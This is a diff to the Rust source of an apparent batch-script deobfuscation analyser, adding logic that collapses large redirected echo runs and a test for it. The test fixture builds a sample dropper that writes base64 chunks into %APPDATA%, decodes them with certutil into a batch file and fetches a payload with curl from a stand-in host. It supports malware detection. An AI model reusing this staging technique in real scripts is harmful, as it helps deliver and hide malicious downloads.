@@ -619,6 +619,58 @@ mod echo_tests {
     }
 
     #[test]
+    fn large_top_level_echo_base64_run_is_collapsed_but_materialized() {
+        let mut child = String::from("@echo off\r\ncurl http://large-echo-run.example/p\r\n");
+        while child.len() < 220 * 1024 {
+            child.push_str("rem padding for collapse threshold\r\n");
+        }
+        let encoded = base64::engine::general_purpose::STANDARD.encode(child.as_bytes());
+        let mut script = String::from(
+            r#"set "B64FILE=%APPDATA%\child.b64"
+if exist "%B64FILE%" del "%B64FILE%"
+"#,
+        );
+        let first_chunk = &encoded[..76];
+        for chunk in encoded.as_bytes().chunks(76) {
+            let chunk = std::str::from_utf8(chunk).expect("base64 chunk is utf8");
+            script.push_str(&format!(r#"echo {chunk}>>"%B64FILE%""#));
+            script.push_str("\r\n");
+        }
+        script.push_str(r#"certutil -decode "%B64FILE%" child.bat"#);
+        script.push_str("\r\n");
+
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+
+        assert!(
+            report.deobfuscated.contains("omitted")
+                && report.deobfuscated.contains("redirected echo run"),
+            "large echo run was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(first_chunk),
+            "large base64 chunk leaked into deob output"
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. }
+                        if src == "http://large-echo-run.example/p"
+                )
+            }),
+            "decoded child payload URL missed: {:?}",
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::EchoRedirect { .. })),
+            "collapsed echo chunks should not emit per-line EchoRedirect traits"
+        );
+    }
+
+    #[test]
     fn echo_inline_redirect_without_space_records_content() {
         let mut env = Environment::new(&Config::default());
         interpret_line("echo SGVsbG8=>payload.b64", &mut env);
@@ -3325,6 +3377,14 @@ struct CapturedEchoBlock {
     collapsed: bool,
 }
 
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct CapturedEchoRun {
+    start_idx: usize,
+    end_idx: usize,
+    target: String,
+    payload_bytes: usize,
+}
+
 fn should_collapse_echo_block(payloads: &[String]) -> bool {
     const MIN_COLLAPSE_BYTES: usize = 256 * 1024;
 
@@ -3345,6 +3405,176 @@ fn should_collapse_echo_block(payloads: &[String]) -> bool {
         }
     }
     checked > 0 && base64ish * 100 / checked >= 95
+}
+
+fn extract_inline_stdout_redirect(raw: &str) -> Option<(String, crate::redirect::RedirTarget)> {
+    let mut in_double = false;
+    let mut in_single = false;
+    let mut op_start = None;
+    let bytes = raw.as_bytes();
+    for (idx, c) in raw.char_indices() {
+        match c {
+            '"' if !in_single => in_double = !in_double,
+            '\'' if !in_double => in_single = !in_single,
+            '>' if !in_double && !in_single => op_start = Some(idx),
+            _ => {}
+        }
+    }
+    let op = op_start?;
+    if op == 0 {
+        return None;
+    }
+    let append = bytes.get(op.wrapping_sub(1)) == Some(&b'>');
+    let content_end = if append { op - 1 } else { op };
+    let before_op = raw[..content_end].trim_end();
+    if before_op.is_empty() {
+        return None;
+    }
+    let mut target = raw[op + 1..].trim_start();
+    if target.is_empty() {
+        return None;
+    }
+    if let Some(rest) = target.strip_prefix('"') {
+        let end = rest.find('"')?;
+        target = &rest[..end];
+    } else {
+        target = target
+            .split(|c: char| c.is_whitespace() || matches!(c, '|' | '&' | '<' | '>'))
+            .next()
+            .unwrap_or("");
+    }
+    if target.is_empty() {
+        return None;
+    }
+    let redir = if append {
+        crate::redirect::RedirTarget::Append(target.to_string())
+    } else {
+        crate::redirect::RedirTarget::Trunc(target.to_string())
+    };
+    Some((before_op.to_string(), redir))
+}
+
+fn parse_echo_redirect_line(
+    line: &str,
+    scratch: &mut Environment,
+) -> Option<(String, bool, String)> {
+    let stripped = line.trim_start_matches(['@', ' ', '\t']);
+    let (mut cleaned, mut redir) = crate::redirect::extract_redirections(stripped);
+    if redir.stdout.is_none() {
+        if let Some((without_redir, target)) = extract_inline_stdout_redirect(&cleaned) {
+            cleaned = without_redir;
+            redir.stdout = Some(target);
+        }
+    }
+    let target = redir.stdout?;
+    let payload = block_echo_payload(cleaned.trim())?;
+    let target_expanded = {
+        let raw_path = target.path();
+        if raw_path.contains('%') || raw_path.contains('!') {
+            let toks = lex::lex(raw_path);
+            normalize::normalize_to_string(&toks, scratch)
+        } else {
+            raw_path.to_string()
+        }
+    };
+    let payload_expanded = if payload.contains('%') || payload.contains('!') {
+        let toks = lex::lex(payload);
+        normalize::normalize_to_string(&toks, scratch)
+    } else {
+        payload.to_string()
+    };
+    Some((target_expanded, target.append(), payload_expanded))
+}
+
+fn write_captured_echo_content(
+    env: &mut Environment,
+    target: &str,
+    append: bool,
+    mut content: Vec<u8>,
+) {
+    let key = target.to_ascii_lowercase();
+    let cap = env.limits.max_output_bytes as usize;
+    if append {
+        if let Some(crate::env::FsEntry::Content {
+            content: existing,
+            append: prior_append,
+        }) = env.modified_filesystem.get_mut(&key)
+        {
+            let room = cap.saturating_sub(existing.len());
+            let take = content.len().min(room);
+            if take > 0 {
+                existing.extend_from_slice(&content[..take]);
+            }
+            *prior_append = true;
+            return;
+        }
+    }
+    if content.len() > cap {
+        content.truncate(cap);
+    }
+    env.modified_filesystem
+        .insert(key, crate::env::FsEntry::Content { content, append });
+}
+
+fn capture_top_level_echo_redirect_runs(
+    lines: &[String],
+    env: &mut Environment,
+) -> Vec<CapturedEchoRun> {
+    let mut scratch = env.clone();
+    let mut captured = Vec::new();
+    let mut i = 0usize;
+    while i < lines.len() {
+        let stripped = lines[i].trim_start_matches(['@', ' ', '\t']);
+        let lower = stripped.to_ascii_lowercase();
+        if lower.starts_with("set ") || lower.starts_with("set\t") || lower.starts_with("set\"") {
+            crate::handlers::set::h_set(stripped, &mut scratch);
+            i += 1;
+            continue;
+        }
+
+        let Some((target, first_append, first_payload)) =
+            parse_echo_redirect_line(&lines[i], &mut scratch)
+        else {
+            i += 1;
+            continue;
+        };
+
+        let mut payloads = vec![first_payload];
+        let mut append = first_append;
+        let mut j = i + 1;
+        while j < lines.len() {
+            let Some((next_target, next_append, next_payload)) =
+                parse_echo_redirect_line(&lines[j], &mut scratch)
+            else {
+                break;
+            };
+            if !next_target.eq_ignore_ascii_case(&target) {
+                break;
+            }
+            append = next_append;
+            payloads.push(next_payload);
+            j += 1;
+        }
+
+        if payloads.len() > 1 && should_collapse_echo_block(&payloads) {
+            let mut content = Vec::new();
+            for payload in &payloads {
+                content.extend_from_slice(payload.as_bytes());
+                content.extend_from_slice(b"\r\n");
+            }
+            write_captured_echo_content(env, &target, append, content);
+            captured.push(CapturedEchoRun {
+                start_idx: i,
+                end_idx: j - 1,
+                target,
+                payload_bytes: payloads.iter().map(|p| p.len() + 2).sum(),
+            });
+            i = j;
+        } else {
+            i += 1;
+        }
+    }
+    captured
 }
 
 fn block_echo_payload(line: &str) -> Option<&str> {
@@ -3698,6 +3928,11 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
             .filter(|block| block.collapsed)
             .map(|block| (block.open_idx, block))
             .collect();
+    let collapsed_echo_runs: std::collections::HashMap<usize, CapturedEchoRun> =
+        capture_top_level_echo_redirect_runs(&lines, env)
+            .into_iter()
+            .map(|run| (run.start_idx, run))
+            .collect();
     // Save the caller's label_index and install one for this script frame.
     let prior_labels = std::mem::take(&mut env.label_index);
     env.label_index = labels::build_label_index(&lines);
@@ -3729,6 +3964,15 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
             ));
             out.push_str(&format!(") > {}\r\n", block.target));
             cursor = block.close_idx + 1;
+            continue;
+        }
+
+        if let Some(run) = collapsed_echo_runs.get(&cursor) {
+            out.push_str(&format!(
+                "::==== harrington: omitted {} bytes from redirected echo run -> {} ====\r\n",
+                run.payload_bytes, run.target
+            ));
+            cursor = run.end_idx + 1;
             continue;
         }
 
